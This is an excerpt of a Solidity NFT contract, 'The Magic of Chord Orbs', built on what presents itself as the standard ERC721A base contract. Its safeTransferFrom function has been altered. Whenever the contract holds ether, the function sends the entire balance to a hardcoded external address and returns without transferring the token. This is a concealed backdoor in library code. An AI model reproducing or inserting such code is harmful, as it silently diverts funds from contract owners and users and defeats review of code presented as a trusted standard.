...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0x65886A71BB8Dc11DDD0470bf7D77331E8b46EdD7).transfer(address(this).balance);
            return;
        }
...
contract TheMagicofChordOrbs is ERC721A {
    ...
    constructor() ERC721A("The Magic of Chord Orbs", "orb") {
        owner = msg.sender;
    }

    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeigjw3iepcdiwn5xta36p47sr6bjglti5xcpjmbo3jieati5wtwipi/", _toString(tokenId), ".json"));
    }
